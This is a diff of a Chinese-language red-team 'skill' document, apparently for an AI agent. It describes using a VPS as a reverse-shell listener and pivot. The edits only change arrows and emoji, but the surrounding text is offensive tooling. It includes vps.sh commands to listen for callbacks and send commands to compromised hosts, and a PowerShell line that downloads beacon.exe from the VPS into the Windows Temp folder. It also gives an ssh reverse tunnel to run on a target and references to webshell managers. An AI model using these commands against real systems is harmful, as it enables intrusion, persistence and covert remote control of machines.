@@ -16,8 +16,8 @@ enabled: true
 | 场景 | 选择 |
 | --- | --- |
 | 目标能直连本机（同网段、有公网 IP） | 直接本机监听，**不必**用 VPS |
-| 目标只能出网、本机在内网（NAT 后） | ✅ 用 VPS，这是主场景 |
-| 目标是云主机/容器，出网受限但能出 80/443 | ✅ 用 VPS 的 9000-9999（若被限制就用 443/80 类端口，见排障） |
+| 目标只能出网、本机在内网（NAT 后） | 推荐：用 VPS，这是主场景 |
+| 目标是云主机/容器，出网受限但能出 80/443 | 推荐：用 VPS 的 9000-9999（若被限制就用 443/80 类端口，见排障） |
 | 只需要跑一条命令拿结果 | 优先用 Web 漏洞/RCE 的 HTTP 通道，比反弹 shell 更稳更隐蔽 |
 
 ## 资产与凭据
@@ -25,8 +25,8 @@ enabled: true
 ```
 主机    : <你的VPS_IP>（腾讯云，Ubuntu 24.04，2C2G，主机名 <VPS 主机名>）
 用户    : ubuntu（sudo 免密）
-私钥    : ~/.dsh/redteam/toolkit/vps/id_rsa          ← 权限 600，不要复制进仓库/聊天
-可用端口: 9000-9999                                   ← 云安全组只放了这一段
+私钥    : ~/.dsh/redteam/toolkit/vps/id_rsa          <- 权限 600，不要复制进仓库/聊天
+可用端口: 9000-9999                                   <- 云安全组只放了这一段
 工具脚本: ~/.dsh/redteam/toolkit/vps/vps.sh
 ```
 
@@ -42,7 +42,7 @@ VPS=~/.dsh/redteam/toolkit/vps/vps.sh
 
 $VPS status                 # 看 VPS 状态、剩余端口、现有会话
 $VPS listen                 # 自动挑一个空闲端口开监听（也可 $VPS listen 9000）
-# → 拿到端口后，用目标上的漏洞执行反弹命令（见下一节）
+# -> 拿到端口后，用目标上的漏洞执行反弹命令（见下一节）
 $VPS send 9000 'id; uname -a'      # 目标回连后，下发命令
 $VPS read 9000 60                  # 读回输出
 $VPS kill 9000                     # 用完必须清理
@@ -148,7 +148,7 @@ powershell -c "iwr http://<你的VPS_IP>:9100/beacon.exe -OutFile C:\Windows\Tem
 目标在内网、本机不可达时，用 VPS 当跳板：
 
 ```bash
-# 反向隧道：VPS:9200 → 目标内网 10.0.0.5:8080（在目标上执行）
+# 反向隧道：VPS:9200 -> 目标内网 10.0.0.5:8080（在目标上执行）
 ssh -R 9200:10.0.0.5:8080 -N -f -o StrictHostKeyChecking=no -i <目标上的密钥> ubuntu@<你的VPS_IP>
 # 之后本机经 VPS 访问：ssh -L 8080:127.0.0.1:9200 ubuntu@<你的VPS_IP>
 
@@ -181,7 +181,7 @@ WebShell 场景配合技能 `suo5-tunnel`：把 suo5 客户端放本机，服务
 
 ## 与其他技能的关系
 
-- `suo5-tunnel`：WebShell → SOCKS5 隧道，出口可以走本 VPS
+- `suo5-tunnel`：WebShell -> SOCKS5 隧道，出口可以走本 VPS
 - `webshell-toolkit`：冰蝎/哥斯拉/蚁剑，拿到 WebShell 后的管理
 - `cn-proxy-pool`：需要国内出口 IP 时叠加代理（不要改动本机网络配置）
 - `active-scan` / `fofa-recon`：内网可达后继续测绘
